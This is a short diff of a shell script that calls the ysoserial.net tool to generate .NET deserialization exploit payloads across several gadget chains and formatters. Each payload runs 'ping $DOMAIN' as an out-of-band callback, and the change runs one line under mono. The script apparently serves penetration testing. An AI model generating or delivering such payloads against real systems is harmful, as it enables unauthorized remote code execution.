@@ -6,7 +6,7 @@ mono ~/progs/ysoserial.net/ysoserial.exe -g TypeConfuseDelegateMono -f LosFormat
 printf "\n\nTypeConfuseDelegate w/ BinaryFormatter\n=====================\n"
 ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "ping $DOMAIN"
 printf "\n\nTypeConfuseDelegateMono w/ BinaryFormatter\n=====================\n"
-ysoserial.exe -g TypeConfuseDelegateMono -f BinaryFormatter -c "ping $DOMAIN"
+mono ~/progs/ysoserial.net/ysoserial.exe -g TypeConfuseDelegateMono -f BinaryFormatter -c "ping $DOMAIN"
 printf "\n\nTextFormattingRunProperties w/ LosFormatter\n=====================\n"
 ysoserial.exe -g TextFormattingRunProperties -f LosFormatter -c "ping $DOMAIN" -o raw
 printf "\n\nObjectDataProvider w/ JSON.Net\n=====================\n"
